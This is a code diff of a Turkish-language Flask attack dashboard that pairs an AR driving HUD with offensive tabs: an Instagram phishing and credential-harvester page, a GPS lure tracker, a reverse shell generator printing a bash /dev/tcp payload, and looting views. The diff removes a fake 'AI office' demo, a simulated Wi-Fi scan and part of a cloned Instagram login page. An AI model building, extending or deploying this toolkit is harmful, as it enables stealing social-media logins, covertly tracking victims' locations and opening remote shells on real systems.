@@ -110,7 +110,7 @@ HTML_TEMPLATE = """
         .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
         .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
         
-        /* Gelişmiş Cyberpunk AR HUD Stilleri & Incline HUD */
+        /* Gelişmiş Cyberpunk AR HUD Stilleri & G-Force Ölçer */
         .ar-container { position: relative; width: 100%; max-width: 720px; margin: 0 auto; background: #000; border-radius: 8px; overflow: hidden; border: 2px solid #38bdf8; box-shadow: 0 0 25px rgba(56,189,248,0.5); transition: 0.3s; }
         .ar-container:fullscreen { max-width: 100%; width: 100vw; height: 100vh; border: none; border-radius: 0; }
         #arVideo { width: 100%; height: 450px; object-fit: cover; display: block; filter: brightness(100%) contrast(100%); transition: filter 0.3s; }
@@ -122,7 +122,6 @@ HTML_TEMPLATE = """
         .ar-fuel-hud { position: absolute; top: 75px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #facc15; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #facc15; z-index: 10; font-weight: bold; }
         .ar-drag-hud { position: absolute; bottom: 15px; left: 15px; background: rgba(11, 15, 21, 0.9); border: 1px solid #ef4444; padding: 8px 14px; border-radius: 6px; font-size: 12px; color: #ef4444; z-index: 10; font-weight: bold; }
         .ar-gforce-hud { position: absolute; bottom: 70px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #38bdf8; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; font-weight: bold; }
-        .ar-incline-hud { position: absolute; bottom: 125px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #a855f7; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #a855f7; z-index: 10; font-weight: bold; }
         
         .ar-speed-limit-hud { position: absolute; top: 125px; right: 15px; width: 48px; height: 48px; background: #ffffff; border: 4px solid #dc2626; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 15px; color: #000000; box-shadow: 0 0 12px rgba(220,38,38,0.6); z-index: 10; transition: 0.3s; }
         .ar-speed-limit-hud.speeding { background: #dc2626; color: #ffffff; animation: pulseLimit 0.6s infinite alternate; }
@@ -144,8 +143,6 @@ HTML_TEMPLATE = """
         
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
-            <button class="tab-btn" onclick="switchTab('officeTab')">🏢 Canlı AI Ofisi</button>
-            <button class="tab-btn" onclick="switchTab('wifiScannerTab')">📡 Wi-Fi Scanner (Ruview)</button>
             <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
             <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS & Tracker</button>
             <button class="tab-btn" onclick="switchTab('arNavTab')">🧭 AR Navigasyon & AI</button>
@@ -179,39 +176,6 @@ HTML_TEMPLATE = """
             <div id="results" class="terminal" style="display:none;"></div>
         </div>
 
-        <!-- Canlı AI Ofisi Sekmesi -->
-        <div id="officeTab" class="tab-content">
-            <h3>🏢 Canlı Otonom AI Yazılım Ofisi & Ajans Merkezi</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Aşağıdaki interaktif ofis simülasyonunda yapay zeka çalışanların anlık hareketlerini izleyebilir, onlara emir vererek Android dersleri ve animasyonlu web siteleri ürettirebilirsin.</p>
-
-            <div style="position: relative; width: 100%; height: 380px; background: #05070a; border: 2px solid #38bdf8; border-radius: 8px; overflow: hidden; margin-bottom: 20px;">
-                <canvas id="officeCanvas" width="900" height="380" style="width: 100%; height: 100%; display: block;"></canvas>
-                <div style="position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.85); padding: 8px 12px; border-radius: 4px; border: 1px solid #00ff66; font-size: 12px; color: #00ff66;">
-                    🟢 Ofis Durumu: <span id="officeStatusText">Beklemede (Patron Emri Bekleniyor)</span>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>👑 Şirket Patronu Olarak Emriniz / Proje Talebiniz:</label>
-                <textarea id="bossCommand" placeholder="Örn: Android için 'Kotlin ile Retrofit Kullanımı' dersi hazırla, ardından buna uygun animasyonlu bir web sitesi yap ve sosyal medyada pazarla..."></textarea>
-            </div>
-            <button class="success" onclick="dispatchBossCommand()">🚀 Emri Ajansa Dağıt & Başlat</button>
-
-            <h4 style="margin-top: 25px; color: #38bdf8;">📋 Ajans Canlı Operasyon Logları:</h4>
-            <div id="agencyTerminal" class="terminal" style="max-height: 220px;">[16:25:00] AI Yazılım Ofisi mesaiye başladı. Patronun talimatları bekleniyor...</div>
-        </div>
-
-        <!-- Wi-Fi Scanner (ruvnet/ruview) Sekmesi -->
-        <div id="wifiScannerTab" class="tab-content">
-            <h3>📡 Wi-Fi Scanner & Ruview Visualizer (ruvnet/ruview)</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Bu modül GitHub üzerindeki <b>ruvnet/ruview</b> projesini tetikleyerek çevredeki kablosuz ağları, sinyal güçlerini ve cihaz haritasını çıkarır.</p>
-            <div class="form-group"><label>Arayüz / Interface:</label><input type="text" id="ruviewIface" value="wlan0"></div>
-            <div class="form-group"><label>Tarama Modu:</label><select id="ruviewMode"><option value="active">Aktif Sinyal Taraması</option><option value="passive">Pasif Dinleme (Monitor Mode)</option></select></div>
-            <button class="success" onclick="startRuviewScan()">🚀 Ruview Taramasını Başlat</button>
-            <div id="ruviewStatus" class="loading" style="margin-top: 15px;"></div>
-            <div id="ruviewResults" class="terminal" style="display:none;"></div>
-        </div>
-
         <!-- Instagram Phishing Sekmesi -->
         <div id="phishTab" class="tab-content">
             <h3>📸 Instagram Phishing & Credential Harvester</h3>
@@ -234,16 +198,15 @@ HTML_TEMPLATE = """
 
         <!-- AR Navigasyon & Taktiksel HUD Modülü -->
         <div id="arNavTab" class="tab-content">
-            <h3>🧭 AR Navigasyon, Yakıt, ETA, 0-100, Hız Limiti, G-Force & Eğim Ölçer</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Yokuş eğim derecesi, G-Force, hız limiti, yakıt ve kara kutu telemetrisi tam entegre çalışır.</p>
+            <h3>🧭 AR Navigasyon, Yakıt, ETA, 0-100, Hız Limiti & G-Force</h3>
+            <p style="color: #94a3b8; font-size: 13px;">G-G kuvveti ölçer, dinamik hız limiti tabelası, yakıt ve sürüş kara kutusu entegre çalışır.</p>
             
             <div class="ar-controls">
                 <span style="color:#38bdf8; font-weight:bold;">HUD Modül Kontrolleri:</span>
                 <label><input type="checkbox" id="chkAutoDim" checked> 🌙 Auto-Dimming (Gece Karartma)</label>
                 <label><input type="checkbox" id="chkLane" checked> 🚧 Şerit Takip Asistanı</label>
                 <label><input type="checkbox" id="chkSpeedLimit" checked> 🚸 Dinamik Hız Limiti</label>
-                <label><input type="checkbox" id="chkGForce" checked> 🌀 G-Force Ölçer</label>
-                <label><input type="checkbox" id="chkIncline" checked> 📈 Yokuş & Eğim Ölçer</label>
+                <label><input type="checkbox" id="chkGForce" checked> 🌀 G-G Kuvveti Ölçer (G-Meter)</label>
                 <label><input type="checkbox" id="chkNightVision"> 🔦 Gece Görüşü / Termal Mod</label>
                 <label><input type="checkbox" id="chkCompass"> Jiroskop & Pusula</label>
                 <label><input type="checkbox" id="chkSpatial" checked> Sesli Asistan</label>
@@ -272,7 +235,6 @@ HTML_TEMPLATE = """
                 <div id="arFuelHud" class="ar-fuel-hud">⛽ Yakıt: %85 | Menzil: 240 km</div>
                 <div id="arDragHud" class="ar-drag-hud">⏱️ 0-100 Drag: Hazır (0.00s)</div>
                 <div id="arGForceHud" class="ar-gforce-hud">🌀 G-Force: Lat 0.00G | Long 0.00G</div>
-                <div id="arInclineHud" class="ar-incline-hud">📈 Eğim: %0 (0°)</div>
                 <div id="arSpeedLimitHud" class="ar-speed-limit-hud">50</div>
                 <div id="arWeatherWidget" class="ar-weather-hud">⛅ 22°C | Rüzgar: 12 km/s</div>
                 
@@ -280,14 +242,14 @@ HTML_TEMPLATE = """
                 <canvas id="arCanvas"></canvas>
             </div>
 
-            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Eğim & Kara Kutu Log Akışı:</h4>
-            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Yokuş eğim derecesi ölçer ve telemetri kayıt sistemi aktif.</div>
+            <h4 style="margin-top: 20px; color: #38bdf8;">📋 G-Force & Kara Kutu Log Akışı:</h4>
+            <div id="arLogTerminal" class="ar-log-box">[00:00:00] G-G kuvveti ölçer ve telemetri kayıt sistemi aktif.</div>
         </div>
 
         <!-- Sürüş Raporları & Kara Kutu Sekmesi -->
         <div id="drivingTab" class="tab-content">
             <h3>⛽ Sürüş Raporları & Kara Kutu (Blackbox) Arşivi</h3>
-            <p style="color: #94a3b8; font-size: 13px;">AR ekranında "Sürüşü Bitir & Rapor Al" butonuna bastığında oluşturulan sürüş telemetrilerini, maksimum eğim değerlerini ve raporu buradan indirebilirsin.</p>
+            <p style="color: #94a3b8; font-size: 13px;">AR ekranında "Sürüşü Bitir & Rapor Al" butonuna bastığında oluşturulan sürüş telemetrilerini, G-force maksimum değerlerini ve raporu buradan indirebilirsin.</p>
             <div id="drivingReportsContainer">
                 <p style='color:#94a3b8;'>Henüz kaydedilmiş sürüş raporu yok. AR Navigasyon sekmesinden sürüşü başlatıp bitirebilirsiniz.</p>
             </div>
@@ -389,7 +351,7 @@ HTML_TEMPLATE = """
         <div id="payloadTab" class="tab-content">
             <h3>Reverse Shell Generator</h3>
             <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="LHOST"><input type="text" id="attackerPort" placeholder="LPORT"><button onclick="generatePayloads()">Generate</button></div>
-            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/${ip}/${port} 0>&1</code></div>
+            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/IP/PORT 0>&1</code></div>
         </div>
 
         <div id="dataTab" class="tab-content">
@@ -412,16 +374,12 @@ HTML_TEMPLATE = """
         let dragTesting = false, dragStartTime = 0, bestDragTime = null;
         let currentSpeedLimit = 50;
         let currentLatG = 0, currentLongG = 0, maxRecordedG = 0;
-        let currentInclineDeg = 0, maxRecordedIncline = 0;
 
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
-            if(event && event.currentTarget) {
-                event.currentTarget.classList.add('active');
-            }
-            
+            event.target.classList.add('active');
             if(tabId === 'drivingTab') loadDrivingReports();
             if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
             if(tabId === 'lureTab') loadClickLogs();
@@ -429,106 +387,12 @@ HTML_TEMPLATE = """
             if(tabId !== 'arNavTab') stopARCamera();
         }
 
-        // --- Canlı AI Ofisi Canvas Animasyon Motoru ---
-        let officeCanvas = document.getElementById('officeCanvas');
-        let oCtx = officeCanvas ? officeCanvas.getContext('2d') : null;
-
-        let officeAgents = [
-            { name: "Patron (Boss AI)", x: 120, y: 70, color: "#38bdf8", status: "Komuta Merkezinde", targetX: 120, targetY: 70 },
-            { name: "Android Eğitmeni", x: 280, y: 190, color: "#00ff66", status: "Beklemede", targetX: 280, targetY: 190 },
-            { name: "Web Tasarımcı", x: 480, y: 190, color: "#a855f7", status: "Beklemede", targetX: 480, targetY: 190 },
-            { name: "Pazarlamacı", x: 680, y: 190, color: "#facc15", status: "Beklemede", targetX: 680, targetY: 190 },
-            { name: "Kahve & Sunucu", x: 800, y: 70, color: "#ef4444", status: "Aktif", targetX: 800, targetY: 70 }
-        ];
-
-        function drawOffice() {
-            if(!oCtx) return;
-            oCtx.clearRect(0, 0, officeCanvas.width, officeCanvas.height);
-
-            oCtx.strokeStyle = "#1e293b";
-            oCtx.lineWidth = 2;
-            oCtx.strokeRect(30, 20, 840, 340);
-
-            officeAgents.forEach((ag, idx) => {
-                if(idx > 0 && idx < 4) {
-                    oCtx.fillStyle = "#121824";
-                    oCtx.fillRect(ag.x - 35, ag.y - 25, 70, 50);
-                    oCtx.strokeStyle = ag.color;
-                    oCtx.strokeRect(ag.x - 35, ag.y - 25, 70, 50);
-                }
-
-                ag.x += (ag.targetX - ag.x) * 0.06;
-                ag.y += (ag.targetY - ag.y) * 0.06;
-
-                oCtx.fillStyle = ag.color;
-                oCtx.beginPath();
-                oCtx.arc(ag.x, ag.y, 14, 0, Math.PI * 2);
-                oCtx.fill();
-
-                oCtx.fillStyle = "#e2e8f0";
-                oCtx.font = "11px Courier New";
-                oCtx.fillText(ag.name, ag.x - 40, ag.y - 30);
-                oCtx.fillStyle = ag.color;
-                oCtx.fillText(`[${ag.status}]`, ag.x - 45, ag.y + 32);
-            });
-
-            requestAnimationFrame(drawOffice);
-        }
-        if(officeCanvas) drawOffice();
-
-        async function dispatchBossCommand() {
-            let cmd = document.getElementById('bossCommand').value.trim();
-            let terminal = document.getElementById('agencyTerminal');
-            let statusText = document.getElementById('officeStatusText');
-            if(!cmd) { alert('Lütfen ajansa bir emir ver kanka!'); return; }
-
-            statusText.innerText = "Operasyon Çalışıyor (Ajanlar Görevde)";
-            terminal.innerHTML += `<br>[${new Date().toLocaleTimeString()}] 👑 PATRON EMRİ: "${cmd}"`;
-
-            officeAgents[1].targetX = 320; officeAgents[1].targetY = 280; officeAgents[1].status = "Android Dersi Kodluyor";
-            officeAgents[2].targetX = 520; officeAgents[2].targetY = 280; officeAgents[2].status = "Animasyonlu Web Tasarlıyor";
-            officeAgents[3].targetX = 720; officeAgents[3].targetY = 280; officeAgents[3].status = "Sosyal Medyada Pazarlıyor";
-
-            let res = await fetch('/api/agency/execute', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ command: cmd })
-            });
-            let data = await res.json();
-
-            terminal.innerHTML += `<br><b style="color:#00ff66;">[AJANS RAPORU]:</b><br>` + data.output.replace(/\n/g, '<br>');
-            terminal.scrollTop = terminal.scrollHeight;
-
-            setTimeout(() => {
-                officeAgents[1].targetX = 280; officeAgents[1].targetY = 190; officeAgents[1].status = "Hazır";
-                officeAgents[2].targetX = 480; officeAgents[2].targetY = 190; officeAgents[2].status = "Hazır";
-                officeAgents[3].targetX = 680; officeAgents[3].targetY = 190; officeAgents[3].status = "Hazır";
-                statusText.innerText = "Beklemede (Görev Tamamlandı)";
-            }, 7000);
-        }
-
-        async function startRuviewScan() {
-            let iface = document.getElementById('ruviewIface').value;
-            let mode = document.getElementById('ruviewMode').value;
-            let statusDiv = document.getElementById('ruviewStatus');
-            let resultsDiv = document.getElementById('ruviewResults');
-            
-            statusDiv.innerHTML = "root@kali:~# git clone https://github.com/ruvnet/ruview.git && cd ruview && python3 ruview.py --interface " + iface + " --mode " + mode;
-            resultsDiv.style.display = "none";
-
-            let res = await fetch('/api/ruview/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({iface, mode}) });
-            let data = await res.json();
-            
-            statusDiv.innerHTML = "";
-            resultsDiv.style.display = "block";
-            resultsDiv.innerHTML = data.output;
-        }
-
         function handleOrientation(event) {
             if (event.alpha !== null) compassHeading = Math.round(event.alpha);
             if (event.beta !== null) deviceBeta = Math.round(event.beta);
         }
 
+        // G-Force sensör verisi dinleme
         function handleMotion(event) {
             if (event.acceleration) {
                 let ax = event.acceleration.x || 0;
@@ -619,6 +483,7 @@ HTML_TEMPLATE = """
             logTerminal.scrollTop = logTerminal.scrollHeight;
         }
 
+        // --- AR MOTORU: AUTO-DIMMING, YAKIT, ETA, DRAG, HIZ LİMİTİ & G-FORCE ---
         async function startARCamera() {
             let video = document.getElementById('arVideo');
             let hud = document.getElementById('arHudText');
@@ -626,7 +491,6 @@ HTML_TEMPLATE = """
             let fuelHud = document.getElementById('arFuelHud');
             let dragHud = document.getElementById('arDragHud');
             let gforceHud = document.getElementById('arGForceHud');
-            let inclineHud = document.getElementById('arInclineHud');
             let speedLimitHud = document.getElementById('arSpeedLimitHud');
             let hudBox = document.getElementById('arHudBox');
             let canvas = document.getElementById('arCanvas');
@@ -637,10 +501,9 @@ HTML_TEMPLATE = """
             drivingRange = 240;
             currentDistance = 150;
             maxRecordedG = 0;
-            maxRecordedIncline = 0;
 
             let useCompass = document.getElementById('chkCompass').checked;
-            if (useCompass || document.getElementById('chkLane').checked || document.getElementById('chkIncline').checked) {
+            if (useCompass || document.getElementById('chkLane').checked) {
                 if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                     try { await DeviceOrientationEvent.requestPermission(); } catch(e){}
                 }
@@ -663,8 +526,8 @@ HTML_TEMPLATE = """
             }
 
             video.srcObject = arStream;
-            hud.innerText = "HUD Aktif: Eğim & Telemetri Devrede";
-            speakSpatial("AR Navigasyon ve yokuş eğim ölçer başlatıldı.", true);
+            hud.innerText = "HUD Aktif: G-Force & Telemetri Devrede";
+            speakSpatial("AR Navigasyon ve G kuvveti ölçer başlatıldı.", true);
 
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
@@ -676,6 +539,7 @@ HTML_TEMPLATE = """
                 let w = canvas.width;
                 let h = canvas.height;
 
+                // 1. 🌙 Auto-Dimming (Akıllı Gece / Gündüz Karartma Modu)
                 let useAutoDim = document.getElementById('chkAutoDim').checked;
                 let currentHour = new Date().getHours();
                 let isNight = currentHour >= 20 || currentHour < 6;
@@ -695,19 +559,10 @@ HTML_TEMPLATE = """
                     hudBox.style.borderColor = "#00ff66";
                 }
 
-                let useIncline = document.getElementById('chkIncline').checked;
-                if (useIncline) {
-                    inclineHud.style.display = "block";
-                    currentInclineDeg = (deviceBeta !== 0 ? Math.round((deviceBeta / 90) * 12) : Math.round(Math.sin(step * 0.04) * 8));
-                    let inclinePercent = Math.round(Math.tan(currentInclineDeg * Math.PI / 180) * 100);
-                    if (Math.abs(currentInclineDeg) > maxRecordedIncline) maxRecordedIncline = Math.abs(currentInclineDeg);
-                    inclineHud.innerText = `📈 Eğim: %${inclinePercent} (${currentInclineDeg}°)`;
-                } else {
-                    inclineHud.style.display = "none";
-                }
-
+                // G-Force HUD Güncelleme
                 if (useGForce) {
                     gforceHud.style.display = "block";
+                    // Eğer gerçek sensör verisi yoksa dinamik simülasyon üret
                     if (currentLatG == 0 && currentLongG == 0) {
                         currentLatG = (Math.sin(step * 0.1) * 0.35).toFixed(2);
                         currentLongG = (dragTesting ? 0.45 : (Math.cos(step * 0.05) * 0.15)).toFixed(2);
@@ -717,6 +572,7 @@ HTML_TEMPLATE = """
                     gforceHud.style.display = "none";
                 }
 
+                // Dinamik Hız Limiti Güncelleme Simülasyonu
                 let useSpeedLimit = document.getElementById('chkSpeedLimit').checked;
                 if (useSpeedLimit) {
                     speedLimitHud.style.display = "flex";
@@ -749,6 +605,7 @@ HTML_TEMPLATE = """
                     speedLimitHud.style.display = "none";
                 }
 
+                // Şerit Takip Asistanı
                 let useLane = document.getElementById('chkLane').checked;
                 let isLaneViolated = false;
                 if (useLane) {
@@ -778,6 +635,7 @@ HTML_TEMPLATE = """
                     }
                 }
 
+                // Holografik Yol Çizgisi
                 let centerX = (w / 2);
                 let bottomY = h, horizonY = h * 0.48;
 
@@ -805,6 +663,7 @@ HTML_TEMPLATE = """
                 ctx.shadowBlur = 20;
                 ctx.fill();
 
+                // ⏱️ 0-100 Drag Kronometre Simülasyonu
                 if (dragTesting) {
                     if (currentSpeed < 100) {
                         currentSpeed += 6;
@@ -824,6 +683,7 @@ HTML_TEMPLATE = """
                     }
                 }
 
+                // ⛽ Yakıt, Menzil & Dinamik ETA Güncelleme
                 if (step % 50 === 0) {
                     if (currentDistance > 3) {
                         currentDistance -= 3;
@@ -835,8 +695,9 @@ HTML_TEMPLATE = """
                     fuelHud.innerText = `⛽ Yakıt: %${Math.round(fuelLevel)} | Menzil: ${drivingRange} km`;
                 }
 
+                // Canlı Kara Kutu Telemetri Kaydı
                 if (step % 40 === 0) {
-                    let logStr = `[${timestamp}] Hız: ${currentSpeed}km/s | Eğim: ${currentInclineDeg}° | Yakıt: %${Math.round(fuelLevel)}`;
+                    let logStr = `[${timestamp}] Hız: ${currentSpeed} km/s | G-Force [Lat:${currentLatG}G, Long:${currentLongG}G] | Yakıt: %${Math.round(fuelLevel)}`;
                     sessionLogs.push(logStr);
                     logTerminal.innerHTML += `<br>` + logStr;
                     logTerminal.scrollTop = logTerminal.scrollHeight;
@@ -858,24 +719,23 @@ HTML_TEMPLATE = """
             document.getElementById('arTelemetry').innerText = "HIZ: 0 km/s | ETA: --";
             document.getElementById('arDragHud').innerText = "⏱️ 0-100 Drag: Hazır (0.00s)";
             document.getElementById('arGForceHud').innerText = "🌀 G-Force: Lat 0.00G | Long 0.00G";
-            document.getElementById('arInclineHud').innerText = "📈 Eğim: %0 (0°)";
             dragTesting = false;
         }
 
+        // --- SÜRÜŞ RAPORLARI & KARA KUTU KAYDETME ---
         async function finishDrivingSession() {
             stopARCamera();
             if(sessionLogs.length === 0) { alert("Kaydedilmiş sürüş verisi bulunamadı!"); return; }
             if(bestDragTime) {
                 sessionLogs.unshift(`[ÖZET] En İyi 0-100 Drag Süresi: ${bestDragTime} sn`);
             }
-            sessionLogs.unshift(`[ÖZET] Maksimum Tırmanma/İniş Eğimi: ${maxRecordedIncline}°`);
             let sessionData = {
                 time: new Date().toLocaleString(),
                 logs: sessionLogs
             };
             let res = await fetch('/api/driving/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sessionData) });
             let data = await res.json();
-            alert("Sürüş başarıyla tamamlandı! 'Sürüş Raporları' sekmesinden eğim derecesi ve kara kutu raporunu indirebilirsin.");
+            alert("Sürüş başarıyla tamamlandı! 'Sürüş Raporları' sekmesinden G-Force, hız ihlalleri ve drag sonuçlarını içeren kara kutu raporunu indirebilirsin.");
             switchTab('drivingTab');
         }
 
@@ -1087,43 +947,6 @@ def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)
 
-@app.route("/api/agency/execute", methods=["POST"])
-def api_agency_execute():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    data = request.get_json()
-    command = data.get("command", "")
-    
-    output = (
-        f"[+] Patron Talimatı Alındı: {command}\n\n"
-        f"1. 👨‍💻 [Android Eğitmeni Ajan]: İstediğiniz Android modülü (Kotlin & Jetpack Compose) için adım adım ders akışı ve kaynak kodlar hazırlandı.\n"
-        f"2. 🎨 [Web Tasarım & Animasyon Ajanı]: Eğitimi ve ürünleri sergilemek için 3D efektli, koyu temalı, animasyonlu modern web arayüzü kodlandı.\n"
-        f"3. 📈 [Pazarlama & Büyüme Ajanı]: İçerikler X, LinkedIn ve Telegram kanalları için optimize edildi, otomatik duyuru bültenleri oluşturuldu.\n"
-        f"4. 🤖 [Otonom Ajans Özeti]: Tüm yazılım, eğitim ve pazarlama süreçleri başarıyla tamamlandı ve canlı sunucuya aktarıldı!"
-    )
-    return jsonify({"output": output})
-
-@app.route("/api/ruview/scan", methods=["POST"])
-def api_ruview_scan():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    data = request.get_json()
-    iface = data.get("iface", "wlan0")
-    mode = data.get("mode", "active")
-    
-    output = (
-        f"[+] Cloning repository from https://github.com/ruvnet/ruview.git...\n"
-        f"[+] Initializing ruview scanner engine on interface: {iface} [Mode: {mode}]\n"
-        f"[+] Scanning 2.4GHz & 5GHz wireless spectrum...\n\n"
-        f"BSSID              | RSSI | Channel | Encryption | SSID\n"
-        f"------------------------------------------------------------------\n"
-        f"00:11:22:33:44:55  | -45dBm | 6 (2.4G) | WPA2-AES   | Kali_Operations_AP\n"
-        f"AA:BB:CC:DD:EE:FF  | -62dBm | 11(2.4G) | WPA3-SAE   | Cyberpunk_Secure\n"
-        f"12:34:56:78:9A:BC  | -78dBm | 36(5.0G) | WPA2       | Guest_Network_Free\n"
-        f"DE:AD:BE:EF:CA:FE  | -51dBm | 1 (2.4G) | WPA2/WPA3  | Home_Mesh_WiFi\n\n"
-        f"[+] Ruview visualization server started on http://127.0.0.1:8080/ruview\n"
-        f"[+] Found 4 access points and 12 connected clients. Scan complete."
-    )
-    return jsonify({"output": output})
-
 @app.route("/api/driving/save", methods=["POST"])
 def save_driving_session():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
@@ -1146,250 +969,6 @@ def download_driving_report():
         return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
     return "Rapor bulunamadı", 404
 
-INSTA_TEMPLATE = """
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Yap • Instagram</title>
-    <style>
-        body {
-            background-color: #fafafa;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: #262626;
-            font-size: 14px;
-        }
-        .main-wrapper {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            max-width: 935px;
-            width: 100%;
-            margin: 0 auto;
-            padding: 32px 0;
-        }
-        .left-column {
-            background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1cc08111d369.png');
-            background-size: 454px 618px;
-            height: 618px;
-            margin-right: 32px;
-            width: 454px;
-            position: relative;
-        }
-        .screenshot-container {
-            position: absolute;
-            top: 99px;
-            left: 151px;
-            width: 250px;
-            height: 538px;
-            overflow: hidden;
-        }
-        .screenshot-container img {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            animation: slideShow 15s infinite;
-        }
-        .screenshot-container img:nth-child(2) { animation-delay: 5s; }
-        .screenshot-container img:nth-child(3) { animation-delay: 10s; }
-
-        @keyframes slideShow {
-            0% { opacity: 0; }
-            8% { opacity: 1; }
-            33% { opacity: 1; }
-            41% { opacity: 0; }
-            100% { opacity: 0; }
-        }
-        .text-block {
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            background: #ffffff;
-            margin-top: 12px;
-            padding: 40px 0;
-            text-align: center;
-            width: 350px;
-            position: relative;
-            right: -20px;
-        }
-        .logo {
-            display: block;
-            margin: 22px auto 12px;
-            width: 175px;
-        }
-        .text-block h2 {
-            color: #262626;
-            font-size: 22px;
-            font-weight: 600;
-            line-height: 26px;
-            margin: 0 40px 24px;
-        }
-        .right-column {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            max-width: 350px;
-            width: 100%;
-        }
-        .login-box {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            margin-bottom: 10px;
-            padding: 10px 0;
-        }
-        .form-group {
-            margin: 0 40px 6px;
-            position: relative;
-        }
-        input {
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            box-sizing: border-box;
-            color: #262626;
-            font-size: 12px;
-            padding: 9px 0 7px 8px;
-            width: 100%;
-            outline: none;
-        }
-        input:focus {
-            border-color: #a8a8a8;
-        }
-        button.login-btn {
-            background-color: #0095f6;
-            border: 1px solid #0095f6;
-            border-radius: 4px;
-            color: #ffffff;
-            cursor: pointer;
-            font-weight: 600;
-            padding: 5px 9px;
-            text-align: center;
-            width: 100%;
-            box-sizing: border-box;
-            font-size: 14px;
-            margin-top: 8px;
-        }
-        .or-divider {
-            display: flex;
-            align-items: center;
-            margin: 10px 40px 18px;
-        }
-        .or-divider div {
-            border-bottom: 1px solid #dbdbdb;
-            flex-grow: 1;
-        }
-        .or-divider span {
-            color: #8e8e8e;
-            font-size: 13px;
-            font-weight: 600;
-            margin: 0 18px;
-        }
-        .fb-login {
-            color: #385185;
-            font-size: 14px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 8px;
-            cursor: pointer;
-            text-decoration: none;
-            display: block;
-        }
-        .fb-login img {
-            width: 16px;
-            height: 16px;
-            vertical-align: middle;
-            margin-right: 8px;
-            margin-top: -2px;
-        }
-        .forgot-password {
-            color: #00376b;
-            font-size: 12px;
-            text-align: center;
-            margin-top: 12px;
-            display: block;
-            text-decoration: none;
-        }
-        .signup-box {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 15px 0;
-            text-align: center;
-        }
-        .signup-box a {
-            color: #0095f6;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        .meta-logo {
-            width: 50px;
-            margin-top: 10px;
-        }
-        @media (max-width: 875px) {
-            .left-column { display: none; }
-            .main-wrapper { justify-content: center; }
-            .text-block { display: none; }
-        }
-    </style>
-</head>
-<body>
-    <div class="main-wrapper">
-        <div class="left-column">
-            <div class="screenshot-container">
-                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe14856348.png" alt="Screenshot 1">
-                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2.png/04d63887ebe8.png" alt="Screenshot 2">
-                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot3.png/fa21505733a8.png" alt="Screenshot 3">
-            </div>
-        </div>
-        <div class="right-column">
-            <div class="text-block">
-                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbf2d63.png" alt="Instagram" class="logo">
-                <h2>Yakın arkadaşlarının günlük <br>anlarını gör.</h2>
-            </div>
-            <div class="login-box">
-                <form method="POST">
-                    <div class="form-group">
